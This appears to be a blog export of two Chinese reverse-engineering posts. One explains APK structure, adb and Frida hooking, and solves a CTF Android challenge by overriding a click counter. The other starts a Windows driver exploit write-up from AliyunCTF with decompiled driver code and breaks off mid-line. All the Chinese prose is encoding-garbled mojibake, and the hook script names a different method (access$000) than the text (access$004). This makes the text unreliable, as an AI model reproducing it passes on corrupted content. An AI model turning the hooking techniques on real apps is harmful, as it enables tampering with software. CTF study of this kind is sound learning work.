<h3 id="AndroidManifest-xml"><a href="#AndroidManifest-xml" class="headerlink" title="AndroidManifest.xml"></a>AndroidManifest.xml</h3><p>æ˜¯Androidåº”ç”¨ç¨‹åºçš„é…ç½®æ–‡ä»¶ï¼Œæ˜¯ä¸€ä¸ªç”¨æ¥æè¿°Androidåº”ç”¨â€œæ•´ä½“èµ„è®¯â€çš„è®¾å®šæ–‡ä»¶ï¼Œ Androidç³»ç»Ÿå¯ä»¥æ ¹æ®è¿™ä¸ª<strong>è‡ªæˆ‘ä»‹ç»</strong>å®Œæ•´åœ°äº†è§£APKåº”ç”¨ç¨‹åºçš„èµ„è®¯ï¼Œæ¯ä¸ªAndroidåº”ç”¨ç¨‹åºéƒ½å¿…é¡»åŒ…å«ä¸€ä¸ªAndroidManifest.xmlæ–‡ä»¶ï¼Œä¸”å®ƒçš„åå­—æ˜¯å›ºå®šçš„ï¼Œä¸èƒ½ä¿®æ”¹ã€‚æˆ‘ä»¬åœ¨å¼€å‘Androidåº”ç”¨ç¨‹åºçš„æ—¶å€™ï¼Œä¸€èˆ¬éƒ½æŠŠä»£ç ä¸­çš„æ¯ä¸€ä¸ªActivityï¼ŒServiceï¼ŒProviderå’ŒReceiveråœ¨AndroidManifest.xmlä¸­æ³¨å†Œï¼Œåªæœ‰è¿™æ ·ç³»ç»Ÿæ‰èƒ½å¯åŠ¨å¯¹åº”çš„ç»„ä»¶ï¼Œå¦å¤–è¿™ä¸ªæ–‡ä»¶è¿˜åŒ…å«ä¸€äº›æƒé™å£°æ˜ä»¥åŠä½¿ç”¨çš„SDKç‰ˆæœ¬ä¿¡æ¯ç­‰ç­‰ã€‚ç¨‹åºæ‰“åŒ…æ—¶ï¼Œä¼šæŠŠAndroidManifest.xmlè¿›è¡Œç®€å•çš„ç¼–è¯‘ï¼Œä¾¿äºAndroidç³»ç»Ÿè¯†åˆ«ï¼Œç¼–è¯‘ä¹‹åçš„æ ¼å¼æ˜¯AXMLæ ¼å¼</p>
<h3 id="classes-dex"><a href="#classes-dex" class="headerlink" title="classes.dex"></a>classes.dex</h3><p>ä¼ ç»Ÿçš„Javaç¨‹åºï¼Œé¦–å…ˆå…ˆæŠŠJavaæ–‡ä»¶ç¼–è¯‘æˆclassæ–‡ä»¶ï¼Œå­—èŠ‚ç éƒ½ä¿å­˜åœ¨äº†classæ–‡ä»¶ä¸­ï¼ŒJavaè™šæ‹Ÿæœºå¯ä»¥é€šè¿‡è§£é‡Šæ‰§è¡Œè¿™äº›classæ–‡ä»¶ã€‚</p>
<p>è€ŒDalvikè™šæ‹Ÿæœºæ˜¯åœ¨Javaè™šæ‹Ÿæœºè¿›è¡Œäº†ä¼˜åŒ–ï¼Œæ‰§è¡Œçš„æ˜¯Dalvikå­—èŠ‚ç ï¼Œè€Œè¿™äº›Dalvikå­—èŠ‚ç æ˜¯ç”±Javaå­—èŠ‚ç è½¬æ¢è€Œæ¥ï¼Œä¸€èˆ¬æƒ…å†µä¸‹ï¼ŒAndroidåº”ç”¨åœ¨æ‰“åŒ…æ—¶é€šè¿‡AndroidSDKä¸­çš„dxå·¥å…·å°†Javaå­—èŠ‚ç è½¬æ¢ä¸ºDalvikå­—èŠ‚ç ã€‚dxå·¥å…·å¯ä»¥å¯¹å¤šä¸ªclassæ–‡ä»¶è¿›è¡Œåˆå¹¶ï¼Œé‡ç»„ï¼Œä¼˜åŒ–ï¼Œå¯ä»¥è¾¾åˆ°å‡å°ä½“ç§¯ï¼Œç¼©çŸ­è¿è¡Œæ—¶é—´çš„ç›®çš„ã€‚</p>
<p>dxå·¥å…·æŠŠæ¯ä¸ª.classæ–‡ä»¶çš„æ¯ä¸ªåŒºåŸŸçš„å†…å®¹è¿›è¡Œå»é‡ï¼Œé‡ç»„ï¼Œä¼˜åŒ–é‡æ’åç”Ÿæˆdexæ–‡ä»¶ï¼Œç”Ÿæˆçš„dexæ–‡ä»¶å¯ä»¥åœ¨Dalvikè™šæ‹Ÿæœºæ‰§è¡Œï¼Œä¸”é€Ÿåº¦æ¯”è¾ƒå¿«</p>
<h3 id="resources-arsc"><a href="#resources-arsc" class="headerlink" title="resources.arsc"></a>resources.arsc</h3><p>ç”¨æ¥è®°å½•èµ„æºæ–‡ä»¶å’Œèµ„æºIDä¹‹é—´çš„æ˜ å°„å…³ç³»ï¼Œç”¨æ¥æ ¹æ®èµ„æºIDå¯»æ‰¾èµ„æºã€‚Androidçš„å¼€å‘æ˜¯åˆ†æ¨¡å—çš„ï¼Œresç›®å½•ä¸“é—¨ç”¨æ¥å­˜æ”¾èµ„æºæ–‡ä»¶ï¼Œå½“åœ¨ä»£ç ä¸­éœ€è¦è°ƒç”¨èµ„æºæ–‡ä»¶æ—¶ï¼Œåªéœ€è¦è°ƒç”¨findviewbyId()å°±å¯ä»¥å¾—åˆ°èµ„æºæ–‡ä»¶ï¼Œæ¯å½“åœ¨resæ–‡ä»¶å¤¹ä¸‹æ”¾ä¸€ä¸ªæ–‡ä»¶ï¼Œaaptå°±ä¼šè‡ªåŠ¨ç”Ÿæˆå¯¹åº”çš„IDä¿å­˜åœ¨.Ræ–‡ä»¶ï¼Œæˆ‘ä»¬è°ƒç”¨è¿™ä¸ªIDå°±å¯ä»¥ï¼Œä½†æ˜¯åªæœ‰è¿™ä¸ªIDè¿˜ä¸å¤Ÿï¼Œ.Ræ–‡ä»¶åªæ˜¯ä¿è¯ç¼–è¯‘ç¨‹åºä¸æŠ¥é”™ï¼Œå®é™…ä¸Šåœ¨ç¨‹åºè¿è¡Œæ—¶ï¼Œç³»ç»Ÿè¦æ ¹æ®IDå»å¯»æ‰¾å¯¹åº”çš„èµ„æºè·¯å¾„ï¼Œè€Œresources.arscæ–‡ä»¶å°±æ˜¯ç”¨æ¥è®°å½•è¿™äº›IDå’Œèµ„æºæ–‡ä»¶ä½ç½®å¯¹åº”å…³ç³»çš„æ–‡ä»¶ã€‚</p>
<h3 id="kotlin"><a href="#kotlin" class="headerlink" title="kotlin"></a>kotlin</h3><p>kotlin æ˜¯ä¸€é—¨ç¼–ç¨‹è¯­è¨€ï¼Œä¹Ÿå¯ä»¥ç›´æ¥è¿è¡Œåœ¨Javaè™šæ‹Ÿæœºä¸­ï¼Œè¿™ä¸ªç›®å½•å­˜æ”¾kotlinèµ„æº</p>
<h2 id="adb-ç®€å•ä½¿ç”¨"><a href="#adb-ç®€å•ä½¿ç”¨" class="headerlink" title="adb ç®€å•ä½¿ç”¨"></a>adb ç®€å•ä½¿ç”¨</h2><ul>
<li>å°†æ–‡ä»¶æ”¾å…¥androidæœºå™¨é‡Œ</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb push xxx /data/local/tmp</span><br></pre></td></tr></table></figure>

<ul>
<li>å®‰è£…åº”ç”¨</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb install apk.apk</span><br></pre></td></tr></table></figure>

<ul>
<li>å¸è½½</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb uninstall com.xxx.xxx</span><br></pre></td></tr></table></figure>

<ul>
<li>è·å¾—shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb connect &lt;ip&gt;:&lt;port&gt;</span><br><span class="line">adb shell</span><br><span class="line"><span class="meta prompt_"># </span><span class="language-bash"><span class="built_in">exit</span></span></span><br><span class="line">adb disconnect &lt;ip&gt;:&lt;port&gt;</span><br></pre></td></tr></table></figure>

<ul>
<li>å¯åŠ¨æŒ‡å®šçš„activity</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">am start -n &lt;package&gt;/&lt;activity&gt; </span><br></pre></td></tr></table></figure>

<h2 id="frida-ç®€å•ä½¿ç”¨"><a href="#frida-ç®€å•ä½¿ç”¨" class="headerlink" title="frida ç®€å•ä½¿ç”¨"></a>frida ç®€å•ä½¿ç”¨</h2><ul>
<li><p>python çš„ frida-tools å’Œ æ‰‹æœºç«¯çš„ server å¿…é¡»ä¿æŒä¸€è‡´çš„ç‰ˆæœ¬, å¯ä»¥ä½¿ç”¨python venv</p>
</li>
<li><p>CPU ä¿¡æ¯</p>
</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">adb shell getprop ro.product.cpu.abi</span><br></pre></td></tr></table></figure>

<ul>
<li>æŒ‡å‘hook è„šæœ¬</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">frida -U -l hook.js -f com.package.name --no-pause</span><br></pre></td></tr></table></figure>

<ul>
<li>ä½¿ç”¨python æ‰§è¡Œ</li>
</ul>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line"><span class="comment"># frida-ps -Ua è·å¾—ä¸€ä¸ªpidå·</span></span><br><span class="line">process = device.attach(<span class="number">8189</span>)</span><br><span class="line"></span><br><span class="line">path = <span class="string">&quot;hook.js&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># send js</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(path, encoding=<span class="string">&quot;UTF-8&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">Â  Â  jscode = f.readall()</span><br><span class="line">Â  Â  hook = process.create_script(jscode)</span><br><span class="line">hook.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()  <span class="comment"># å¯ä»¥æ“ä½œAndroidè½¯ä»¶å¹¶ä¸”è¿›è¡Œhook</span></span><br></pre></td></tr></table></figure>

<h3 id="hook-java"><a href="#hook-java" class="headerlink" title="hook java"></a>hook java</h3><p>æ¡†æ¶</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Java.perform(() =&gt; &#123;</span><br><span class="line"></span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>è·å¾—ç±»</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">var</span> <span class="variable">stringClass</span> <span class="operator">=</span> Java.use(<span class="string">&quot;java.util.String&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>å®ä¾‹åŒ–</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// åˆ›å»ºä¸€ä¸ªå®ä¾‹</span></span><br><span class="line">stringClass.$<span class="keyword">new</span>()</span><br><span class="line"></span><br><span class="line"><span class="comment">// æˆ‘ä»¬ä¹Ÿå¯ä»¥æŸ¥æ‰¾ä¸€ä¸ªå®ä¾‹</span></span><br><span class="line">Java.choose(<span class="string">&#x27;java.lang.String&#x27;</span>, &#123;  </span><br><span class="line">        onMatch: function(instance)&#123;  </span><br><span class="line">	        console.log(<span class="string">&#x27;String instance is:&#x27;</span>, instance);  </span><br><span class="line">        &#125;,</span><br><span class="line">        onComplete: function()&#123;</span><br><span class="line">	        console.log(<span class="string">&#x27;search complete!&#x27;</span>);</span><br><span class="line">	    &#125;  </span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>æ–¹æ³•</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">// é™æ€æ–¹æ³•</span></span><br><span class="line">className.&lt;method&gt;</span><br><span class="line"></span><br><span class="line"><span class="comment">// å®ä¾‹æ–¹æ³•</span></span><br><span class="line"><span class="comment">// 1. æŸ¥æ‰¾å®ä¾‹è°ƒç”¨</span></span><br><span class="line"><span class="comment">// 2. newä¸€ä¸ªç„¶åè°ƒç”¨</span></span><br></pre></td></tr></table></figure>

<p>å˜é‡</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="comment">// static</span></span><br><span class="line">&lt;class&gt;.&lt;<span class="keyword">var</span>&gt;.value = xxx;</span><br></pre></td></tr></table></figure>

<p>hook java method</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">&lt;class&gt;.&lt;method&gt;.implementation = function(arg...) &#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// é‡è½½: å½“ä¸€ä¸ª class ä¸¤ä¸ªåç§°ç›¸åŒçš„æ–¹æ³•</span></span><br><span class="line">&lt;class&gt;.&lt;method&gt;.overload([TYPE], [TYPE]).implementation = function(args...)&#123; </span><br><span class="line">	<span class="comment">// do sth </span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// æ„é€ å‡½æ•°çš„ hook $init</span></span><br><span class="line">StringBuilder.$init.overload(<span class="string">&#x27;java.lang.String&#x27;</span>).implementation = function (arg) &#123;</span><br><span class="line">    <span class="type">var</span> <span class="variable">partial</span> <span class="operator">=</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">    <span class="type">var</span> <span class="variable">result</span> <span class="operator">=</span> <span class="built_in">this</span>.$init(arg);</span><br><span class="line">    <span class="keyword">if</span> (arg !== <span class="literal">null</span>) &#123;</span><br><span class="line">         partial = arg.toString().replace(<span class="string">&#x27;\n&#x27;</span>, <span class="string">&#x27;&#x27;</span>).slice(<span class="number">0</span>,<span class="number">10</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">// console.log(&#x27;new StringBuilder(java.lang.String); =&gt; &#x27; + result)</span></span><br><span class="line">    console.log(<span class="string">&#x27;new StringBuilder(&quot;&#x27;</span> + partial + <span class="string">&#x27;&quot;);&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h2 id="å…¥é—¨ä¾‹å­"><a href="#å…¥é—¨ä¾‹å­" class="headerlink" title="å…¥é—¨ä¾‹å­"></a>å…¥é—¨ä¾‹å­</h2><h3 id="newstartCTF-2023-lazyactivity"><a href="#newstartCTF-2023-lazyactivity" class="headerlink" title="newstartCTF 2023 lazyactivity"></a>newstartCTF 2023 lazyactivity</h3><p>ä¸¤ä¸ªactivity</p>
<ul>
<li>MainActivity</li>
<li>FlagActivity</li>
</ul>
<p>æ¨¡æ‹Ÿå™¨æ‰“å¼€æ—¶æ˜¯MainActivityï¼Œä½†æ˜¯æˆ‘ä»¬éœ€è¦è¿è¡ŒFlagActivity</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">am start -n com.droidlearn.activity_travel/com.droidlearn.activity_travel.FlagActivit</span><br></pre></td></tr></table></figure>

<p>FlagActivity é€»è¾‘ï¼šç‚¹å‡»10000æ¬¡ï¼Œä½†æ˜¯æˆ‘ä»¬å¯ä»¥hook <code>access$004</code> ä½¿å…¶è¿”å›ç»“æœå¤§äº10000å°±è¡Œ(åŸæ¥çš„é€»è¾‘ä¸ºç‚¹å‡»ä¸€æ¬¡ï¼Œcnt+&#x3D;1, hookåå°±æ˜¯ç‚¹å‡»ä¸€æ¬¡ï¼Œè¿”å›10001)</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">FlagActivity</span> <span class="keyword">extends</span> <span class="title class_">AppCompatActivity</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> <span class="variable">cnt</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">static</span> <span class="comment">/* synthetic */</span> <span class="type">int</span> access$<span class="number">004</span>(FlagActivity flagActivity) &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">i</span> <span class="operator">=</span> flagActivity.cnt + <span class="number">1</span>;</span><br><span class="line">        flagActivity.cnt = i;</span><br><span class="line">        <span class="keyword">return</span> i;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* JADX INFO: Access modifiers changed from: protected */</span></span><br><span class="line">    <span class="meta">@Override</span> <span class="comment">// androidx.fragment.app.FragmentActivity, androidx.activity.ComponentActivity, androidx.core.app.ComponentActivity, android.app.Activity</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onCreate</span><span class="params">(Bundle bundle)</span> &#123;</span><br><span class="line">        <span class="built_in">super</span>.onCreate(bundle);</span><br><span class="line">        setContentView(C0535R.layout.layout_2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">TextView</span> <span class="variable">textView</span> <span class="operator">=</span> (TextView) findViewById(C0535R.C0538id.textView2);</span><br><span class="line">        <span class="keyword">final</span> <span class="type">EditText</span> <span class="variable">editText</span> <span class="operator">=</span> (EditText) findViewById(C0535R.C0538id.editTextTextPersonName2);</span><br><span class="line">        ((Button) findViewById(C0535R.C0538id.button)).setOnClickListener(<span class="keyword">new</span> <span class="title class_">View</span>.OnClickListener() &#123; <span class="comment">// from class: com.droidlearn.activity_travel.FlagActivity.1</span></span><br><span class="line">            <span class="meta">@Override</span> <span class="comment">// android.view.View.OnClickListener</span></span><br><span class="line">            <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">onClick</span><span class="params">(View view)</span> &#123;</span><br><span class="line">                textView.setText(Integer.toString(FlagActivity.access$<span class="number">004</span>(FlagActivity.<span class="built_in">this</span>)));</span><br><span class="line">                <span class="keyword">if</span> (FlagActivity.<span class="built_in">this</span>.cnt &gt;= <span class="number">10000</span>) &#123;</span><br><span class="line">                    Toast.makeText(FlagActivity.<span class="built_in">this</span>, editText.getText().toString(), <span class="number">0</span>).show();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><del>æ˜¯ç”·äººå°±ç‚¹å‡»10000æ¬¡ï¼ˆbushi</del></p>
<p>hook.py</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> frida</span><br><span class="line"><span class="comment"># è¿æ¥å®‰å“æœºä¸Šçš„frida-server</span></span><br><span class="line">device = frida.get_usb_device()</span><br><span class="line">session = device.attach(<span class="number">3157</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># åŠ è½½hooook.jsè„šæœ¬</span></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;lazy_activity.js&quot;</span>, encoding=<span class="string">&#x27;UTF-8&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">Â  Â  script = session.create_script(f.read())</span><br><span class="line">script.load()</span><br><span class="line"></span><br><span class="line"><span class="built_in">input</span>()</span><br></pre></td></tr></table></figure>

<p>hook.js</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Script loaded successfully &quot;</span>);</span><br><span class="line"><span class="title class_">Java</span>.<span class="title function_">perform</span>(<span class="function">() =&gt;</span> &#123;</span><br><span class="line">Â  Â  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Inside java perform function&quot;</span>);</span><br><span class="line">Â  Â  <span class="comment">//å®šä½ç±»</span></span><br><span class="line">Â  Â  <span class="keyword">var</span> my_class = <span class="title class_">Java</span>.<span class="title function_">use</span>(<span class="string">&quot;com.droidlearn.activity_travel.FlagActivity&quot;</span>);</span><br><span class="line">Â  Â  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Java.Use.Successfully!&quot;</span>);</span><br><span class="line">Â  Â  <span class="comment">//åœ¨è¿™é‡Œæ›´æ”¹ç±»çš„æ–¹æ³•çš„å®ç°ï¼ˆimplementationï¼‰</span></span><br><span class="line">Â  Â  my_class.<span class="property">access$000</span>.<span class="property">implementation</span> = <span class="keyword">function</span>(<span class="params">x</span>)&#123;</span><br><span class="line">Â  Â  Â  Â  <span class="comment">//æ‰“å°æ›¿æ¢å‰çš„å‚æ•°</span></span><br><span class="line">Â  Â  Â  Â  <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&quot;Successfully!&quot;</span>);</span><br><span class="line">Â  Â  Â  Â  <span class="keyword">return</span> <span class="number">10001</span>;</span><br><span class="line">Â  Â  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>


<p>è¿è¡Œpythonè„šæœ¬ï¼Œç„¶ååœ¨æ¨¡æ‹Ÿå™¨æˆ–è€…çœŸæœºä¸Šç‚¹å‡»ä¸€ä¸‹å°±è¡Œã€‚</p>
]]></content>
      <categories>
        <category>REVERSE</category>
      </categories>
      <tags>
        <tag>Android</tag>
      </tags>
  </entry>
  <entry>
    <title>AliyunCTF SYSTEM</title>
    <url>/2024/04/25/AliyunCTF-SYSTEM/</url>
    <content><![CDATA[<blockquote>
<p>Windows Driver Exploit</p>
</blockquote>
<span id="more"></span>

<p>çŸ¥è¯†ç‚¹è›®å¤šçš„</p>
<h2 id="Driver"><a href="#Driver" class="headerlink" title="Driver"></a>Driver</h2><p>æ˜¯ä¸ªé©±åŠ¨ï¼Œå†…å®¹æ¯”è¾ƒå°‘ï¼Œç¨å¾®çœ‹ä¸€ä¸‹é€»è¾‘</p>
<p>é©±åŠ¨å…¥å£ï¼šDriverEntryï¼Œç¬¬ä¸€ä¸ªå‡½æ•°æ˜¯Windowsç»™ç¨‹åºåŠ äº† <code>_security_cookie</code>ï¼Œç„¶ååˆå§‹åŒ–DriverObject</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS __stdcall <span class="title">DriverEntry</span><span class="params">(PDRIVER_OBJECT DriverObject, PUNICODE_STRING RegistryPath)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="built_in">sub_14000610C</span>();</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">Init</span>(DriverObject);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>åˆå§‹åŒ–DriverObjectã€‚</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">NTSTATUS __fastcall <span class="title">Init</span><span class="params">(PDRIVER_OBJECT DriverObject)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  NTSTATUS result; <span class="comment">// eax</span></span><br><span class="line">  NTSTATUS v3; <span class="comment">// ebx</span></span><br><span class="line">  _OWORD *DeviceExtension; <span class="comment">// rdx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> DeviceName; <span class="comment">// [rsp+40h] [rbp-28h] BYREF</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_UNICODE_STRING</span> DestinationString; <span class="comment">// [rsp+50h] [rbp-18h] BYREF</span></span><br><span class="line">  PDEVICE_OBJECT DeviceObject; <span class="comment">// [rsp+80h] [rbp+18h] BYREF</span></span><br><span class="line"></span><br><span class="line">  DeviceObject = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">RtlInitUnicodeString</span>(&amp;DeviceName, <span class="string">L&quot;\\Device\\SIOCTL&quot;</span>);</span><br><span class="line">  result = <span class="built_in">IoCreateDevice</span>(DriverObject, <span class="number">0x30</span>u, &amp;DeviceName, <span class="number">0x22</span>u, <span class="number">0x100</span>u, <span class="number">0</span>, &amp;DeviceObject);</span><br><span class="line">  <span class="keyword">if</span> ( result &gt;= <span class="number">0</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">0</span>] = (PDRIVER_DISPATCH)DispatchCommon;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">2</span>] = (PDRIVER_DISPATCH)DispatchCommon;</span><br><span class="line">    DriverObject-&gt;MajorFunction[<span class="number">14</span>] = (PDRIVER_DISPATCH)DispatchControl;</span><br><span class="line">    DriverObject-&gt;DriverUnload = (PDRIVER_UNLOAD)Unload;</span><br><span class="line">    <span class="built_in">RtlInitUnicodeString</span>(&amp;DestinationString, <span class="string">L&quot;\\DosDevices\\IoctlTest&quot;</span>);</span><br><span class="line">    v3 = <span class="built_in">IoCreateSymbolicLink</span>(&amp;DestinationString, &amp;DeviceName);</span><br><span class="line">    DeviceExtension = DeviceObject-&gt;DeviceExtension;</span><br><span class="line">    *DeviceExtension = <span class="number">0</span>i64;</span><br><span class="line">    DeviceExtension[<span class="number">1</span>] = <span class="number">0</span>i64;</span><br><span class="line">    DeviceExtension[<span class="number">2</span>] = <span class="number">0</span>i64;</span><br><span class="line">    <span class="keyword">if</span> ( v3 &lt; <span class="number">0</span> )</span><br><span class="line">      <span class="built_in">IoDeleteDevice</span>(DeviceObject);</span><br><span class="line">    <span class="keyword">return</span> v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    _mm_lfence();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>DispatchCommon</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CREATE                     0x00 </span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_CLOSE                      0x02 </span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchCommon</span><span class="params">(__int64 a1, IRP *a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  a2-&gt;IoStatus.Status = <span class="number">0</span>;</span><br><span class="line">  a2-&gt;IoStatus.Information = <span class="number">0</span>i64;</span><br><span class="line">  <span class="built_in">IofCompleteRequest</span>(a2, <span class="number">0</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>i64;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>


<p>æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„æ˜¯sizeçš„å¤§å°ï¼Œå¹¶ä¸”è¿™ä¸ªsizeå¤§å°ä¸º0x1000çš„å€æ•°ï¼Œå‘ä¸Šå–æ•´</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> IRP_MJ_DEVICE_CONTROL           0x0e</span></span><br><span class="line"><span class="function">__int64 __fastcall <span class="title">DispatchControl</span><span class="params">(PDEVICE_OBJECT pDeviceObject, IRP *irp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_IO_STACK_LOCATION</span> *CurrentStackLocation; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v3; <span class="comment">// ebx</span></span><br><span class="line">  PVOID DeviceExtension; <span class="comment">// rdi</span></span><br><span class="line">  ULONG ulInputBufferLength; <span class="comment">// r8d</span></span><br><span class="line">  ULONG ulOutputBufferLength; <span class="comment">// edx</span></span><br><span class="line">  ULONG ulIoControlCode; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">void</span> *__pStartAddr2; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *__pMdl2; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">void</span> *__pVirtualAddress; <span class="comment">// rcx</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *__pMdl; <span class="comment">// rdx</span></span><br><span class="line">  <span class="type">char</span> *buffer; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _usSize; <span class="comment">// r15d</span></span><br><span class="line">  PVOID ContiguousMemory; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">void</span> *_pVirtualAddress; <span class="comment">// rbp</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *Mdl; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *_pMdl; <span class="comment">// r14</span></span><br><span class="line">  PVOID pStartAddr2; <span class="comment">// rax</span></span><br><span class="line">  PVOID _pStartAddr2; <span class="comment">// r12</span></span><br><span class="line">  _DWORD *SystemBuffer; <span class="comment">// r13</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> usSize; <span class="comment">// r15d</span></span><br><span class="line">  PVOID pVirtualAddress; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">_MDL</span> *pMdl; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> pMapAddr; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> _pMapAddr; <span class="comment">// r12d</span></span><br><span class="line"></span><br><span class="line">  CurrentStackLocation = irp-&gt;Tail.Overlay.CurrentStackLocation;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  DeviceExtension = pDeviceObject-&gt;DeviceExtension;</span><br><span class="line">  ulInputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.InputBufferLength;</span><br><span class="line">  ulOutputBufferLength = CurrentStackLocation-&gt;Parameters.DeviceIoControl.OutputBufferLength;</span><br><span class="line">  <span class="keyword">if</span> ( !ulInputBufferLength || !ulOutputBufferLength )</span><br><span class="line">  &#123;</span><br><span class="line">    v3 = <span class="number">0xC000000D</span>;</span><br><span class="line">    <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">  &#125;</span><br><span class="line">  ulIoControlCode = CurrentStackLocation-&gt;Parameters.DeviceIoControl.IoControlCode;</span><br><span class="line">  <span class="keyword">switch</span> ( ulIoControlCode )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">case</span> <span class="number">0x9C402400</span>:</span><br><span class="line">      <span class="keyword">if</span> ( ulInputBufferLength != <span class="number">4</span> || ulOutputBufferLength != <span class="number">8</span> )</span><br><span class="line">        <span class="keyword">goto</span> LABEL_34;</span><br><span class="line">      SystemBuffer = irp-&gt;AssociatedIrp.SystemBuffer;</span><br><span class="line">      usSize = (*SystemBuffer + <span 